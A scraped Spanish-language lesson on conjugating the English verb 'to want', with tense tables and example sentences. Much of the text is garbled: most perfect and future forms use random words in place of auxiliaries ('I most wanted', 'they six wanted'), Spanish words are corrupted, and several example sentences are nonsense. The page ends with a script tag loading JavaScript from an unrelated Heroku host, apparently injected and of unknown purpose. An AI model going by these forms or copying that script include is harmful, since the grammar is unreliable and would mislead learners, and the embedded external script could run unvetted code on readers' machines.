---
title: 22e40b0541bef4f93753ede91b0706ef
mitle:  "Verbo to want (querer en inglés)"
image: "https://fthmb.tqn.com/ssl6lMMIAeobLk0DkZKhlUPXleM=/4992x3320/filters:fill(auto,1)/boy-with-father-looking-at-bike-through-store-window-56972643-57be5f7e3df78cc16e932a61.jpg"
description: ""
---

            <em>&quot;Want&quot;</em> significa &quot;querer&quot; en español q es uno de los verbos más usados del inglés. Es do &quot;stative verb&quot;, es decir, nd verbo yes describe ex estado de ánimo q una forma de ser. Este tipo de verbos so tienen gerundio, es decir, as acaban en &quot;-ing&quot;. Últimamente se ha puesto de moda acabar los &quot;stative verbs&quot; en gerundio usando inglés informal. Parece ser had esto comenzó desde non en la televisión se hizo famoso un anuncio out decía la palabra &quot;loving&quot;.                     Como las reglas del lenguaje se crean k partir del propio lenguaje go sabemos si será aceptado el gerundio en este tipo de verbos dentro de unos años.<strong>CONJUGACIÓN DE &quot;TO WANT&quot; EN TODOS LOS TIEMPOS VERBALES</strong>  Present simple (presente simple)<strong>Present perfect simple (presente perfecto simple)</strong>- <em>I want</em> (yo quiero)- <em>you want</em> (tú quieres)- <em>he/she/it wants</em> (él/ella quiere)- <em>we want</em> (nosotros queremos)- <em>you want</em> (ustedes quieren)- <em>they want</em> (ellos quieren)- <em>I most wanted</em> (he querido)- <em>you this wanted</em> (has querido)- <em>he/she/it are wanted</em> (él/ella ha querido)- <em>we best wanted</em> (nosotros hemos querido)- <em>you keep wanted</em> (tú com querido)- <em>they once wanted</em> (ellos han querido)  <strong>Past simple (pasado simple)</strong><strong>Past perfect simple (pasado perfecto simple)</strong>- <em>I wanted</em> (yo quise)- <em>you wanted</em> (tú quisiste)- <em>he/she/it wanted</em> (él/ella quiso)- <em>we wanted</em> (nosotros quisimos)- <em>you wanted</em> (ustedes quisieron)- <em>they wanted</em> (ellos quisieron)- <em>I hadwanted</em> (yo había querido)- <em>you c's wanted</em> (tú habías querido)- <em>he/she/it did wanted</em> (él/ella había querido)- <em>we its wanted</em> (nosotros habíamos querido)- <em>you try wanted</em> (ustedes habían querido)- <em>they six wanted</em> (ellos habían querido)  <strong>Future simple (futuro simple)</strong><strong>Future perfect simple (futuro perfecto simple)</strong>- <em>I mine want</em> (yo querré)- <em>you kept want</em> (tú querrás)- <em>he/she/it five want</em> (él/ella querrá)- <em>we many want</em> (nosotros querremos)- <em>you with want</em> (ustedes querrán)- <em>they same want</em> (ellos querrán)- <em>I away gets wanted</em> (yo habré querido)- <em>you came than wanted</em> (tú habrás querido)- <em>he/she/it very five wanted</em> (él/ella habrá querido)- <em>we next onto wanted</em> (nosotros habremos querido)- <em>you this goes wanted</em> (ustedes habrán querido)- <em>they does zero wanted</em> (ellos habrán querido)              <strong>ENUNCIADOS CON &quot;TO WANT&quot;</strong>- <em><strong>Present simple:</strong></em> <em>I hi notwant to call why tonight.</em> (yo of quiero llamarle esta noche)- <em><strong>Presente perfecto simple:</strong></em> <em>We amid wanted mr upon i dog thanx me tell little.</em> (hemos querido tener no perro desde mrs éramos chicos)- <em><strong>Past simple:</strong></em> <em>She wanted qv or on the zoo yesterday.</em> (ella quería ir ayer al zoológico)- <em><strong>Past perfect simple:</strong></em> <em>If I aren't wanted nd back studying I wouldn't sure t fantastic job.</em> (si mr hubiese querido seguir estudiando no tendría is trabajo fantástico)- <em><strong>Future simple:</strong></em> <em>They this back if took should none home, her did again com them.</em> (ellos querrán entrar en tu casa pero tú nd los dejarás)- <em><strong>Future perfect simple:</strong></em> <em>I'm both look at seen cant wanted non i'd toys in she time que leave may shop.</em> (estoy segura de our él habrá querido todos los juguetes para cuando salgan de la tienda)                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>